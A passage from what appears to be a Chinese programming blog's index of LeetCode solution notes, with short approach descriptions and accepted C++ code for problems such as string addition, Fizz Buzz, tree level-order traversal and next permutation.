lo,hi; long mid; lo = 0; hi = x; while(lo&lt;=hi){ mid = lo + (hi-lo)/2; if(mid*mid&gt;x){ hi = mid-1; } else if ((mid+1)*(mid+1)&gt;x) { return mid; } else{ lo = mid+1; } } return lo;} 371. 两整数之和思路 用位运算 不会 AC代码123456789101112class Solution {public: int getSum(int a, int b) { int temp = 0; while(a &amp; b){ temp = a; a ^= b; b = (temp &amp; b) &lt;&lt; 1; } return a|b; }}; 374. 猜数字大小思路 暴力搜索不可取，二分查找保平安 不要mid = (high + low) / 2，会溢出12345678910111213141516171819202122232425// Forward declaration of guess API.// @param num, your guess// @return -1 if my number is lower, 1 if my number is higher, otherwise return 0int guess(int num);class Solution {public: int guessNumber(int n) { int left = 1, right = n, mid = (n + 1)/2; while (left &lt;= right) { mid = (left - right)/2 + right; switch (guess(mid)) { case -1 : right = mid - 1; break; case 1 : left = mid + 1; break; case 0 : return mid; } } return -1; }}; 383. 赎金信思路 两个表，分别记录每个字母出现次数 遍历26个字母，magazine中字母出现次数大于等于ransom就可以 AC代码1234567891011121314151617class Solution {public: bool canConstruct(string ransomNote, string magazine) { int m[26] = {0}, n[26] = {0}; for (char x : ransomNote) { m[x-'a']++; } for (char x : magazine) { n[x-'a']++; } for (char x : ransomNote) { if (m[x-'a'] &gt; n[x-'a']) return false; } return true; }}; 387. 字符串中的第一个唯一字符思路记录每个字母出现次数，遍历字符串，看谁第一个出现次数是0 AC代码1234567891011121314class Solution {public: int firstUniqChar(string s) { int n[26] = {0}; for (char x : s) { n[x - 'a']++; } int len = s.length(); for (int i = 0; i &lt; len; i++) { if (n[s[i] - 'a'] == 1) return i; } return -1; }}; 389. 找不同思路 记录次数，遍历一遍t，看谁出现次数多一次 异或运算，抵消相同的 AC代码12345678910111213141516class Solution {public: char findTheDifference(string s, string t) { int m[26] = {0}, n[26] = {0}; for (char x : s) { m[x - 'a']++; } for (char x : t) { n[x - 'a']++; } for (char x : t) { if (m[x - 'a'] &lt; n[x - 'a']) return x; } return -1; }}; AC代码123456789101112class Solution {public: char findTheDifference(string s, string t) { int len = s.length(); char c = t[0]; for (int i = 0; i &lt; len; i++) { c ^= s[i]; c ^= t[i + 1];//t只比s多一个 } return c; }}; 400. 第N个数字思路 把 $10^1$,$10^2$, $10^3$…之前的数算出来，存到数组里 查询数组，得到这个数对应的数量级之前有多少数，然后算出这个数具体是几 AC代码1234567891011121314151617class Solution {public: int findNthDigit(int n) { unsigned long long m[10] = {0, 9, 189, 2889, 38889, 488889, 5888889, 68888889, 788888889, 8888888889}; //10^i之前的数字个数。10之前有9个数，100之前有189个数 int index = 0; for (; index &lt; 10; index++) { if (m[index] &gt;= n) { break; } }//找到n所在的范围，index是它的位数len n -= m[index - 1];//从例如189对应的100后的第几个数字 long long ans = pow(10, index - 1) + (n - 1) / (index);//对应的数 string t = to_string(ans); return t[(n - 1) % (index)] - '0'; }}; 405. 数字转换为十六进制数思路 用一个unsigned char指针指向int，循环4次，每次取值是两个16进制数，然后存起来 注意局部变量存在栈里，倒着输出 忽略前导0 AC代码12345678910111213141516171819202122class Solution {public: string toHex(int num) { if (!num) return &quot;0&quot;; char m[16] = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'}; unsigned char *c = (unsigned char *)&amp;num; unsigned int n[8] = {0}; for (int i = 0; i &lt; 8; i+=2) { n[i] = (*c) % 16; n[i + 1] = (*c/16) % 16; c++; } string ans; int i = 7; while (i &gt;= 0 &amp;&amp; n[i] == 0) i--; for (; i &gt;= 0; i--) { ans += m[n[i]]; } return ans; }}; 412. Fizz Buzz思路额，，算就是了 AC代码123456789101112131415161718192021class Solution { public: vector&lt;string&gt; fizzBuzz(int n) { vector&lt;string&gt; v; for (int i = 1; i &lt;= n; i++) { if (i % 15 == 0) { v.push_back(&quot;FizzBuzz&quot;); } else if (i % 3 == 0) { v.push_back(&quot;Fizz&quot;); } else if (i % 5 == 0) { v.push_back(&quot;Buzz&quot;); } else { v.push_back(to_string(i)); } } return v; }}; 414. 第三大的数思路 搜索三次 第一次最大值 第二次不等于第一次的最大值 第三次不等于前两次的最大值 AC代码1234567891011121314151617181920212223class Solution {public: int thirdMax(vector&lt;int&gt;&amp; nums) { long i = LONG_MIN, j = LONG_MIN, k = LONG_MIN; for (int x : nums) { if (x &gt; i) { i = x; } } for (int x : nums) { if (x &gt; j &amp;&amp; x != i) { j = x; } } for (int x : nums) { if (x &gt; k &amp;&amp; x != i &amp;&amp; x != j) { k = x; } } if (k == LONG_MIN) return i; else return k; }}; 大佬思路 搜索一次找最大值 如果有最大值且大于最大的最大值，就把当前值先给了第二大值，第二大值给了第三大值 如果有最大值且小于最大的最大值大于第二大，往后顺延 如果有最大值且小于第二大的最大值大于第三大，往后顺延 大佬代码12345678910111213141516171819class Solution {public: int thirdMax(vector&lt;int&gt;&amp; nums) { long first = LONG_MIN, second = LONG_MIN, third = LONG_MIN; for (int num : nums) { if (num &gt; first) { third = second; second = first; first = num; } else if (num &gt; second &amp;&amp; num &lt; first) { third = second; second = num; } else if (num &gt; third &amp;&amp; num &lt; second) { third = num; } } return (third == LONG_MIN || third == second) ? first : third; }}; 415. 字符串相加思路 找到最长字符串的长度，用这个长度分别给两个字符串添加前导0 倒着遍历字符串，对应相加模拟就行了 别网站最后一位的进位 AC代码1234567891011121314151617181920212223242526class Solution {public: string addStrings(string num1, string num2) { int carry = 0; int len1 = num1.length(); int len2 = num2.length(); int len = len1 &gt; len2 ? len1 : len2; string zero; for (int i = 0; i &lt; len - len1; i++) { zero += '0'; } num1.insert(0, zero); zero.clear(); for (int i = 0; i &lt; len - len2; i++) { zero += '0'; } num2.insert(0, zero); for (int i = len - 1; i &gt;= 0; i--) { int n = carry + num1[i] + num2[i] - 2*'0'; num1[i] = n % 10 + '0'; carry = n / 10; } if (carry) num1.insert(0, 1, carry + '0'); return num1; }}; 434. 字符串中的单词数思路stl大法好 AC代码123456789101112class Solution {public: int countSegments(string s) { stringstream ss(s); string buf; int count = 0; while (ss &gt;&gt; buf) { count++; } return count; }}; 447. 回旋镖的数量思路 把所有点两两配对，计算距离 累加n(n-1)排列数$2A_n^2$ AC代码1234567891011121314151617181920class Solution {public: int numberOfBoomerangs(vector&lt;pair&lt;int, int&gt;&gt;&amp; points) { unordered_map&lt;int ,int&gt; m; int ans = 0; int len = points.size(); for (int i = 0; i &lt; len; i++) { for (int j = 0; j &lt; len; j++) { int dx = points[i].first - points[j].first; int dy = points[i].second - points[j].second; m[dx*dx + dy*dy]++; } for (auto c : m) { ans += c.second*(c.second-1); } m.clear(); } return ans; }}; 441. 排列硬币思路 直接解方程 AC代码123456class Solution {public: int arrangeCoins(int n) { return (sqrt(1 + 8ll * n) - 1) / 2; }}; 大佬思路类似二分查找 计算当前mid对应的楼梯数q 如果q&lt;=总数，查找右边 否则查找左边 大佬代码1234567891011121314151617class Solution {public: int arrangeCoins(int n) { if (n &lt;= 0) return 0; unsigned long long i = 1, j = n + 1; while (j - i&gt;= 1) { long long mid = i + (j - i) / 2; long long q = mid*(mid + 1) / 2; if (q &lt;= n) { i = mid + 1; } else { j = mid; } } return i - 1; }}; 443. 压缩字符串思路遍历数次数，然后把次数编程string存起来，最后一个字符一个字符的存到vector数组里，返回 AC代码12345678910111213141516171819202122232425262728293031class Solution {public: vector&lt;char&gt; ans; int compress(vector&lt;char&gt;&amp; chars) { int len = chars.size(); vector&lt;string&gt; s; int j = 0; int count = 0; for (int i = 1; i &lt; len; i++) { if (chars[j] != chars[i]) { j++; chars[j] = chars[i]; s.push_back(to_string(count + 1)); count = 0; } else { count++; } } s.push_back(to_string(count + 1)); for (int i = 0; i &lt; j + 1; i++) { ans.push_back(chars[i]); if (s[i] == &quot;1&quot;) continue; int num = s[i].length(); for (int k = 0; k &lt; num; k++) { ans.push_back(s[i][k]); } } chars = ans; return chars.size(); }}; 大佬思路遍历一遍，数个数，然后都存到一个string里面（充分利用string重载的operator+），最后分解成char数组，返回 大佬代码123456789101112131415161718192021222324252627282930313233343536class Solution { public: int compress(vector&lt;char&gt; &amp;chars) { int count = 1; string str = &quot;&quot;; for (int i = 1; i &lt; chars.size(); i++) { if (chars[i] == chars[i - 1]) { count++; } else { if (count != 1) { str += chars[i - 1] + to_string(count); } else { str += chars[i - 1]; } count = 1; } } if (count != 1) { str += chars[chars.size() - 1] + to_string(count); } else { str += chars[chars.size() - 1]; } for (int i = 0; i &lt; str.size(); i++) { if (i &lt; chars.size()) { chars[i] = str[i]; } else { chars.push_back(str[i]); } } return str.size(); }}; 448. 找到所有数组中消失的数字思路记录每个数的出现次数，最后返回出现次数为0的那些数 AC代码1234567891011121314151617class Solution {public: vector&lt;int&gt; findDisappearedNumbers(vector&lt;int&gt;&amp; nums) { unordered_map&lt;int, int&gt; m; vector&lt;int&gt; ans; int len = nums.size(); for (int x : nums) { m[x]++; } for (int i = 1; i &lt;= len; i++) { if (m[i] == 0) { ans.push_back(i); } } return ans; }}; 大佬思路 i从0开始遍历数组，取nums[i]的绝对值Q（后期正数可能变负数） 把Q-1作为下标，把nums[Q-1]这个数编程负的（自己的绝对值的相反数） 最后正数出现的位置就是1~n没出现过的数 大佬代码12345678910111213141516class Solution {public: vector&lt;int&gt; findDisappearedNumbers(vector&lt;int&gt;&amp; nums) { vector&lt;int&gt; ans; int len = nums.size(); for (int i = 0; i &lt; len; i++) { nums[abs(nums[i]) - 1] = -abs(nums[abs(nums[i]) - 1]); } for (int i = 0; i &lt; len; i++) { if (nums[i] &gt; 0) { ans.push_back(i + 1); } } return ans; }}; 455. 分发饼干思路贪心算法 + 双指针法 把所有小孩的胃口的出现次数统计出来，放到哈希表里面 把所有饼干能满足的最大胃口的出现次数统计出来，放到另一个哈希表里面 不用unordered_map，要排序的 遍历一遍孩子，如果当前饼干能满足胃口，就尽量多的喂 直到这个孩子的胃口被满足后，i++，不要j++，也许当前饼干还没有用完，而且足够下一个孩子的胃口 如果不能满足胃口，由于map是排序过的，所以也一定不能满足后面的孩子的要求，就j++看下一块饼干的情况 AC代码1234567891011121314151617181920212223242526272829class Solution {public: int findContentChildren(vector&lt;int&gt;&amp; g, vector&lt;int&gt;&amp; s) { map&lt;int, int&gt; bit, chi; for (int x : g) { chi[x]++; } for (int x : s) { bit[x]++; } int ans = 0; auto i = chi.begin(), j = bit.begin(); for (; i != chi.end() &amp;&amp; j != bit.end(); ) { if (i-&gt;first &lt;= j-&gt;first &amp;&amp; j-&gt;second &gt; 0) { int a = i-&gt;second; int b = j-&gt;second; int min = a &gt; b ? b : a; i-&gt;second -= min; j-&gt;second -= min; ans += min; if (i-&gt;second == 0) i++; } else { j++; } } return ans; }}; 大佬思路贪心 + 双指针 排序两个数组 其他思路和我的基本一样，但是人家的代码又简洁效率又高 大佬代码12345678910111213141516class Solution {public: int findContentChildren(vector&lt;int&gt;&amp; g, vector&lt;int&gt;&amp; s) { sort(g.begin(), g.end()); sort(s.begin(), s.end()); int ans = 0; int i = 0, j = 0; int len1 = g.size(), len2 = s.size(); for (; i &lt; len1 &amp;&amp; j &lt; len2;j++) { if (g[i] &lt;= s[j]) { i++; } } return i; }}; 461. 汉明距离思路位运算 异或，相同为1，不同为0 两个数异或，转二进制，把二进制位直接加起来就行 AC代码123456789101112class Solution {public: int hammingDistance(int x, int y) { int ans = x ^ y; int num = 0; while (ans) { num += ans % 2; ans /= 2; } return num; }}; 463. 岛屿的周长思路 只能暴搜了，如果一个格子上有颜色，总边数+=4 如果下方有格子，总边数-=2（不管上面，防止两条边重复计数） 如果右边有格子，总边数-=2（同理，不管左边） AC代码12345678910111213141516171819202122class Solution {public: int islandPerimeter(vector&lt;vector&lt;int&gt;&gt;&amp; grid) { int ans = 0; int len = grid.size(); int wide = grid[0].size(); for(int i = 0; i &lt; len; i++) { for (int j = 0; j &lt; wide; j++) { if (grid[i][j]) { ans += 4; if (i + 1 &lt; len &amp;&amp; grid[i + 1][j]) { ans -= 2; } if (j + 1 &lt; wide &amp;&amp; grid[i][j + 1]) { ans -= 2; } } } } return ans; }}; 476. 数字的补数思路 转二进制数 (num%2+1)%2能让1变0，0变1 AC代码12345678910111213class Solution {public: int findComplement(int num) { int n = 0; long long i = 1; while (num) { n += i * ((num % 2 + 1) % 2); i *= 2; num /= 2; } return n; }}; 大佬思路位运算，不懂 大佬代码123456789101112class Solution {public: int findComplement(int num) { int temp = num; int c = 0; while ( temp &gt; 0 ) { temp &gt;&gt;= 1; c = ( c &lt;&lt; 1 ) + 1; } return num ^ c; }}; 482. 密钥格式化思路 把'-'全都变成' ' stringstream把字符串拼起来 倒着遍历每K个加一个'-'，并且注意前面是不是头 AC代码1234567891011121314151617181920212223class Solution {public: string licenseKeyFormatting(string S, int K) { string ans, buf; for (int i = 0; i &lt; S.length(); i++) { if (S[i] == '-') { S[i] = ' '; } else { S[i] = toupper(S[i]); } } stringstream ss(S); while (ss &gt;&gt; buf) { ans += buf; } for (int i = ans.length() - 1, count = 1; i &gt; 0; i--, count++) { if (count % K == 0 &amp;&amp; i != 0) { ans.insert(i, 1, '-'); } } return ans; }}; 思路 遍历，判断是不是字母，是字母，变大写，然后push到新的string里面 同时记录字符数，每K个加一个负号 清除前后的负号 反转 AC代码123456789101112131415161718192021222324class Solution {public: string licenseKeyFormatting(string S, int K) { string ans; int count = 0; int len = S.length(); for (int i = len; i &gt;= 0; i--) { char t = S[i]; t = toupper(t); if (t != '-') { ans.push_back(t); if (count == K /*&amp;&amp; i != 0 &amp;&amp; i != len*/) { ans.push_back('-'); count = 0; } count++; } } if (ans.back() == '-') ans.pop_back(); reverse(ans.begin(), ans.end()); if (ans.back() == '-') ans.pop_back(); return ans; }}; 485. 最大连续1的个数AC代码123456789101112131415161718class Solution {public: int findMaxConsecutiveOnes(vector&lt;int&gt;&amp; nums) { int len = nums.size(); int count = 0, max = 0; for (int x : nums) { if (x) { count++; } else { //max = max &gt; count ? max : count; if (max &lt; count) max = count; count = 0; } } if (max &lt; count) max = count; return max; }}; 500. 键盘行思路 建立哈希表，把每个字母对应的键盘行数标号 遍历所有字符串，看是不是同一行，统计，记录 按照要求输出 AC代码12345678910111213141516171819202122232425262728293031class Solution {public: vector&lt;string&gt; findWords(vector&lt;string&gt;&amp; words) { string keyBoard[3] = {&quot;QWERTYUIOP&quot;, &quot;ASDFGHJKL&quot;, &quot;ZXCVBNM&quot;}; unordered_map&lt;char, char&gt; m; for (int i = 0; i &lt; 3; i++) { int len = keyBoard[i].length(); for (int j = 0; j &lt; len; j++) { m[keyBoard[i][j]] = i; m[keyBoard[i][j] - 'A' + 'a'] = i; } } int n = words.size(); vector&lt;string&gt; ans; for (int i = 0; i &lt; n; i++) { int len = words[i].length(); int cmp = m[words[i][0]]; bool find = true; for (int j = 0; j &lt; len; j++) { if (cmp != m[words[i][j]]) { find = false; break; } } if (find) { ans.push_back(words[i]); } } return ans; }}; 504. 七进制数思路就是普通进制转换问题 AC代码123456789101112131415161718class Solution {public: string convertToBase7(int num) { string ans; bool nagetive = num &lt; 0; if (nagetive) { num *= -1; } do { ans = (char)(num % 7 + '0') + ans; num /= 7; } while (num); if (nagetive){ ans = &quot;-&quot; + ans; } return ans; }}; 506. 相对名次思路 拷贝一份，排序，map记录排名 遍历原来的数组，输出 AC代码12345678910111213141516171819202122class Solution {public: vector&lt;string&gt; findRelativeRanks(vector&lt;int&gt;&amp; nums) { vector&lt;int&gt; copy = nums; string rank[3] = {&quot;Gold Medal&quot;, &quot;Silver Medal&quot;, &quot;Bronze Medal&quot;}; map&lt;int, int&gt; m; sort(copy.begin(), copy.end(), greater&lt;int&gt;()); int len = nums.size(); for (int i = 0; i &lt; len; i++) { m[copy[i]] = i; } vector&lt;string&gt; ans; for (auto x : nums) { if (m[x] &gt;= 0 &amp;&amp; m[x] &lt; 3) { ans.push_back(rank[m[x]]); } else { ans.push_back(to_string(m[x] + 1)); } } return ans; }}; 507. 完美数思路AC代码12345678910111213class Solution {public: bool checkPerfectNumber(int num) { if (num &lt;= 1) return false; int ans = 1; for (int i = 2; i &lt; sqrt(num); i++) { if (num % i == 0) { ans += i + num/i; } } return ans == num; }}; 思路$1*10^8$的完美数只有6,28,496,8128,33550336 AC代码12345678910111213class Solution { public boolean checkPerfectNumber(int num) { switch(num) { case 6: case 28: case 496: case 8128: case 33550336: return true; } return false; }} 509. 斐波那契数思路居然真的只是求斐波那契数列，还只要前30位 AC代码123456789101112class Solution {public: int fib(int N) { int a = 0, b = 1; for (int i = 0; i &lt; N; i++) { int c = a + b; b = a; a = c; } return a; }}; 520. 检测大写字母思路 先把前导的大写字母跳过 如果当前指针正好指在0或1，那么只要后面有大写字母，就算错（除非长度只有1） 如果指在1后面，那么后面有小写字母就算错 AC代码class Solution { public: bool detectCapitalUse(string word) { int len = word.length(); int i = 0; while (i &lt; len &amp;&amp; word[i] &gt;= 'A' &amp;&amp; word[i] &lt;= 'Z') i++; if (i &gt; 1) { for ( ; i &lt; len; i++) { if (word[i] &gt;= 'a' &amp;&amp; word[i] &lt;= 'z') { return false; } } } else { if (len &lt;= 1) { return true; } else { for ( ; i &lt; len; i++) { if (word[i] &gt;= 'A' &amp;&amp; word[i] &lt;= 'Z') { return false; } } } } return true; } };","link":"/home/2019/02/12/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%935/"},{"title":"LeetCode-6","text":"3. 无重复字符的最长子串思路双指针 如果字符串长度为1的话，直接返回1 建立哈希表，储存字符所在的位置（从1开始数） i，j两个指针，i用来遍历字符串（位置靠前），j用来记录当前不重复的字符的位置 每次循环，先查询map中s[i]的位置，如果在j的字符之前，说明从i到j没有重复字符 如果位置在j或j之后，说明出现重复字符，那么先不移动j，i-j的值就是一个非重复子串的长度 然后让j指向s[i]的下一个位置，这样就又变成了一个不重复的子串 循环结束，但是最后一次的统计没有记录，再记录一次。 AC代码123456789101112131415161718192021222324class Solution {public: int lengthOfLongestSubstring(string s) { if (s.length() == 1) return 1; unordered_map&lt;char, int&gt; m; int len = s.length(); int count = 0; int max = 0; int i = 0, j = 0; for ( ; i &lt; len; i++) { if (m[s[i]] &lt; j + 1) { m[s[i]] = i + 1; } else { count = i - j; j = m[s[i]]; max = max &gt; count ? max : count; m[s[i]] = i + 1; } } count = i - j; max = max &gt; count ? max : count; return max; }}; 8. 字符串转换整数 (atoi)AC代码12345678910111213141516171819202122232425class Solution {public: int myAtoi(string str) { int len = str.length(); int i = 0; while(i &lt; len &amp;&amp; str[i] == ' ')i++; int ans = 0; int nage = 1; if (i &lt; len &amp;&amp; str[i] == '-') { nage = -1; i++; } else if (i &lt; len &amp;&amp; str[i] == '+') { i++; } while (i &lt; len &amp;&amp; isdigit(str[i])) { if (ans*10ll &gt; INT_MAX) return nage == 1 ? INT_MAX : INT_MIN; ans *= 10; if (ans+(long long)(str[i] - '0') &gt; INT_MAX) return nage == 1 ? INT_MAX : INT_MIN; ans += str[i] - '0'; i++; } ans *= nage; return ans; }}; 11. 盛最多水的容器思路双指针 两个指针分别指向首尾 比较两个指针的大小，计算面积 把刚才较小的指针移动一格 AC代码123456789101112131415161718class Solution {public: int maxArea(vector&lt;int&gt;&amp; height) { int i = 0, j = height.size() - 1; int max = 0, a; while (i &lt; j) { if (height[i] &lt; height[j]) { a = height[i]*(j - i); i++; } else { a = height[j]*(j - i); j--; } max = max &gt; a ? max : a; } return max; }}; 12. 整数转罗马数字思路把所有的符号和对应的数字存起来，然后转化 AC代码123456789101112131415class Solution {public: string intToRoman(int num) { vector&lt;int&gt; vals = {1000,900,500,400,100,90,50,40,10,9,5,4,1}; vector&lt;string&gt; romans = {&quot;M&quot;, &quot;CM&quot;,&quot;D&quot;,&quot;CD&quot;,&quot;C&quot;,&quot;XC&quot;,&quot;L&quot;,&quot;XL&quot;,&quot;X&quot;,&quot;IX&quot;,&quot;V&quot;,&quot;IV&quot;,&quot;I&quot;}; string ans; for (int i = 0; i &lt; 13;i++) { while (num &gt;= vals[i]) { ans += romans[i]; num -= vals[i]; } } return ans; }}; 19. 删除链表的倒数第N个节点思路 vector保存结点地址，然后用数组访问下标愉快的操作 两次遍历，第一次计算链表长度，这样就可以计算出指针移动多少次可以到达要删除的位置，这样就可以删除了 一次遍历，两个指针（a， b）。创建一个哑结点指向头结点，a指向哑结点，b先向后移动n次，然后a，b一起移动，直到b移动到结尾。这样a就移动到了要删除的结点的前面。然后删除。然后返回哑结点的next。 AC代码12345678910111213141516171819202122232425262728293031/** * Definition for singly-linked list. * struct ListNode { * int val; * ListNode *next; * ListNode(int x) : val(x), next(NULL) {} * }; */class Solution {public: ListNode* removeNthFromEnd(ListNode* head, int n) { vector&lt;ListNode*&gt; v; ListNode* temp = head; while (temp != NULL) { v.push_back(temp); temp = temp-&gt;next; } int len = v.size(); if (len == n) { temp = head; head = head-&gt;next; delete temp; return head; } temp = v[len - n]; ListNode* x = v[len - n - 1]; x-&gt;next = temp-&gt;next; delete temp; return head; }}; AC代码12345678910111213141516171819202122232425class Solution {public: ListNode* removeNthFromEnd(ListNode* head, int n) { ListNode* temp = head; int len = 0; while (temp != NULL) { temp = temp-&gt;next; len++; } int pos = len - n; temp = head; if (pos) { for (int i = 0; i &lt; pos - 1; i++) { temp = temp-&gt;next; } ListNode* del = temp-&gt;next; temp-&gt;next = temp-&gt;next-&gt;next; delete del; } else { head = head-&gt;next; delete temp; } return head; }}; AC代码1234567891011121314151617181920class Solution {public: ListNode* removeNthFromEnd(ListNode* head, int n) { ListNode *a, *b = head; a = new ListNode(0);//哑结点 a-&gt;next = head; head = a;//让head指向哑结点，最后return的接口统一 for (int i = 0; i &lt; n; i++) { b = b-&gt;next;//b指针先走 } while (b != NULL) { a = a-&gt;next; b = b-&gt;next; } ListNode* del = a-&gt;next; a-&gt;next = a-&gt;next-&gt;next; delete del; return head-&gt;next; }}; 31. 下一个排列思路 没思路，不过以前用过的代码找出来了 不知道为啥自己写的reverse函数效率比stl的reverse慢 AC代码12345678910111213141516171819202122232425262728293031class Solution {public: void nextPermutation(vector&lt;int&gt;&amp; nums) { int len = nums.size(); int i = len - 1; int j = i - 1; while (j &gt;= 0 &amp;&amp; nums[j] &gt;= nums[j+1]) { j--; } if (j &lt; 0) { std::reverse(nums.begin(), nums.end()); return; } i = len - 1; while (i &gt;= 0 &amp;&amp; nums[i] &lt;= nums[j]) { i--; } swap(nums[i], nums[j]); std::reverse(nums.begin()+j+1, nums.end()); } void swap(int&amp; a, int&amp; b) { int t = a; a = b; b = t; } void reverse(vector&lt;int&gt;&amp; nums, int beg, int end) { for (int i = beg, j = end - 1; i &lt; j; i++, j--) { swap(nums[i], nums[j]); } }}; 123456class Solution {public: void nextPermutation(vector&lt;int&gt;&amp; nums) { next_permutation(nums.begin(), nums.end()); }}; 50. Pow(x, n)思路 直接算肯定不行的 如果算$x^4$，可以看做是$(x^2)^2$ 同样的$x^y = (x^2)^\\frac{y}{2}$，以此类推$x^y = (x^{2m})^{\\frac{y}{2m}}$ AC代码12345678910111213class Solution {public: double myPow(double x, int n) { double ans = 1; for (int i = n; i != 0; i /= 2) { if (i % 2 != 0) { ans *= x; } x *= x; } return n &lt; 0 ? 1/ans : ans; }}; 46. 全排列思路把上次31. 下一个排列的代码复制过来，改一改或者直接调用next_permutation AC代码123456789101112131415161718192021222324252627282930class Solution {public: vector&lt;vector&lt;int&gt;&gt; permute(vector&lt;int&gt;&amp; nums) { sort(nums.begin(), nums.end()); vector&lt;vector&lt;int&gt;&gt; ans; do { ans.push_back(nums); } while (nextPermutation(nums)); return ans; } bool nextPermutation(vector&lt;int&gt;&amp; nums) { int len = nums.size(); int i = len - 1; int j = i - 1; while (j &gt;= 0 &amp;&amp; nums[j] &gt;= nums[j+1]) { j--; } if (j &lt; 0) { std::reverse(nums.begin(), nums.end()); return false; } i = len - 1; while (i &gt;= 0 &amp;&amp; nums[i] &lt;= nums[j]) { i--; } swap(nums[i], nums[j]); std::reverse(nums.begin()+j+1, nums.end()); return true; }};","link":"/home/2019/02/12/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%936/"},{"title":"LeetCode-7","text":"532. 数组中的K-diff数对思路 map，保存每个数出现的次数 遍历map，如果要找差为0的数对，那么如果出现次数大于1，说明有一对儿 如果差不是0，算出另一个数，在map里面查询，查询到了就是一对儿 AC代码12345678910111213141516171819202122class Solution {public: int findPairs(vector&lt;int&gt;&amp; nums, int k) { if (k &lt; 0) return 0; map&lt;int, int&gt; m; for (int x : nums) { m[x]++; } int ans = 0; auto ite = m.begin(); while (ite != m.end()) { if (k) { int sum = ite-&gt;first + k; if (m.count(sum)) ans++;//这里要用count函数查询是否存在元素，直接访问会超时 } else { if (ite-&gt;second &gt; 1) ans++; } ite++; } return ans; }}; 70. 爬楼梯思路 在纸上计算，可以发现是斐波那契数列的第n+1项 AC代码123456789101112131415class Solution {public: int climbStairs(int n) { return fib(n + 1); } int fib(int N) { int a = 0, b = 1; for (int i = 0; i &lt; N; i++) { int c = a + b; b = a; a = c; } return a; }}; 429. N叉树的层序遍历思路遍历爷爷辈的数组，每次把孙子辈们全都放在一个sub数组里面，如果push完以后非空，就push到ans里面，然后把父亲辈放到fatherTemp数组里面，作为下一次的爷爷辈。为了处理第1第2辈，建立两个哑节点，统一算法 AC代码123456789101112131415161718192021222324252627282930313233343536373839404142434445/*// Definition for a Node.class Node {public: int val; vector&lt;Node*&gt; children; Node() {} Node(int _val, vector&lt;Node*&gt; _children) { val = _val; children = _children; }};*/class Solution {public: vector&lt;vector&lt;int&gt;&gt; levelOrder(Node* root) { if (!root) return {}; Node *root1 = new Node(); Node *root2 = new Node(); root2-&gt;children.push_back(root); root1-&gt;children.push_back(root2); vector&lt;vector&lt;int&gt;&gt; ans; vector&lt;int&gt; sub; vector&lt;Node*&gt; m = {root1}; vector&lt;Node*&gt;&amp; father = m; while (father.size()) { sub.clear(); vector&lt;Node*&gt; fatherTemp; for (Node* x : father) { for (Node* y : x-&gt;children) { for (Node* z : y-&gt;children) { sub.push_back(z-&gt;val); } fatherTemp.push_back(y); } } if (sub.size()) ans.push_back(sub); father = fatherTemp; } return ans; }}; 大佬思路大佬代码1234567891011121314151617181920static auto x = []() { std::ios::sync_with_stdio(false);std::cin.tie(nullptr);return 0;}();class Solution {public: vector&lt;vector&lt;int&gt;&gt; levelOrder(Node* root) { vector&lt;vector&lt;int&gt;&gt; ans; queue&lt;Node*&gt; que; if(!root) return ans; que.push(root); while(!que.empty()){ int k=que.size(); ans.resize(ans.size()+1); for(int i=0;i&lt;k;i++){ ans[ans.size()-1].push_back(que.front()-&gt;val); for(Node* node:que.front()-&gt;children) que.push(node); que.pop(); } } return ans; }}; 102. 二叉树的层次遍历思路和上一题429. N叉树的层序遍历一个想法 AC代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647/** * Definition for a binary tree node. * struct TreeNode { * int val; * TreeNode *left; * TreeNode *right; * TreeNode(int x) : val(x), left(NULL), right(NULL) {} * }; */class Solution {public: vector&lt;vector&lt;int&gt;&gt; levelOrder(TreeNode* root) { if (!root) return {}; vector&lt;vector&lt;int&gt;&gt; ans; vector&lt;int&gt; sub; TreeNode *root1 = new TreeNode(0), *root2 = new TreeNode(0); root2-&gt;left = root; root1-&gt;left = root2; TreeNode* temp = root1; vector&lt;TreeNode*&gt; m = {root1}; vector&lt;TreeNode*&gt;&amp; father = m; vector&lt;TreeNode*&gt; fatherTemp; while (father.size()) { fatherTemp.clear(); sub.clear(); for (TreeNode* x : father) { if (x-&gt;left != NULL) { fatherTemp.push_back(x-&gt;left); if (x-&gt;left-&gt;left != NULL) sub.push_back(x-&gt;left-&gt;left-&gt;val); if (x-&gt;left-&gt;right != NULL) sub.push_back(x-&gt;left-&gt;right-&gt;val); } if (x-&gt;right != NULL) { fatherTemp.push_back(x-&gt;right); if (x-&gt;right-&gt;left != NULL) sub.push_back(x-&gt;right-&gt;left-&gt;val); if (x-&gt;right-&gt;right != NULL) sub.push_back(x-&gt;right-&gt;right-&gt;val); } } if (sub.size()) ans.push_back(sub); father = fatherTemp; } return ans; }}; 404. 左叶子之和思路 递归 如果左边的左边和左边的右边都是空，那么我的左边就是个叶子 改进，不用vector存结点的指针，直接加起来 AC代码1234567891011121314151617181920212223242526272829303132/** * Definition for a binary tree node. * struct TreeNode { * int val; * TreeNode *left; * TreeNode *right; * TreeNode(int x) : val(x), left(NULL), right(NULL) {} * }; */class Solution {public: int sumOfLeftLeaves(TreeNode* root) { vector&lt;TreeNode*&gt; leaves; int ans = 0; getLeaves(root, leaves); for (auto x : leaves) { ans += x-&gt;val; } return ans; } void getLeaves(TreeNode* root, vector&lt;TreeNode*&gt;&amp; leaves) { if (root == NULL) return; if (root-&gt;left == NULL &amp;&amp; root-&gt;right == NULL) return; if (root-&gt;left != NULL) { if (root-&gt;left-&gt;left == NULL &amp;&amp; root-&gt;left-&gt;right == NULL) { leaves.push_back(root-&gt;left); } } getLeaves(root-&gt;left, leaves); getLeaves(root-&gt;right, leaves); }}; AC代码（改进）1234567891011121314151617181920class Solution {public: int sumOfLeftLeaves(TreeNode* root) { vector&lt;TreeNode*&gt; leaves; int ans = 0; getLeaves(root, ans); return ans; } void getLeaves(TreeNode* root, int&amp; sum) {//传入引用 if (root == NULL) return; if (root-&gt;left == NULL &amp;&amp; root-&gt;right == NULL) return; if (root-&gt;left != NULL) { if (root-&gt;left-&gt;left == NULL &amp;&amp; root-&gt;left-&gt;right == NULL) { sum += root-&gt;left-&gt;val; } } getLeaves(root-&gt;left, sum); getLeaves(root-&gt;right, sum); }}; 492. 构造矩形思路 两个变量a，b,a = sqrt(area)，a++不断搜索，直到第一个为整数，然后a = 